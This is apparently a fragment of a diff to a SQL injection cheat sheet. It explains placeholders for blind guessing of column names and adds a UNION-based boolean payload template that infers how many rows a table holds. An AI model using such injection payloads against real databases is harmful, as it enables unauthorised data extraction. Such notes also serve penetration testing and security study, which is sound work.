@@ -27,3 +27,7 @@
 {index}: The index of the column (0 = first column, 1 = second column, etc.).
 {position}: The position of the character in the column name (1 = first character, 2 = second character, etc.).
 {ascii_value}: The ASCII value of the character you are trying to guess.
+
+
+- Dump the number of rows in a table:
+' UNION SELECT 1 WHERE (SELECT COUNT(*) FROM {table_name}) = {row_count}-- -
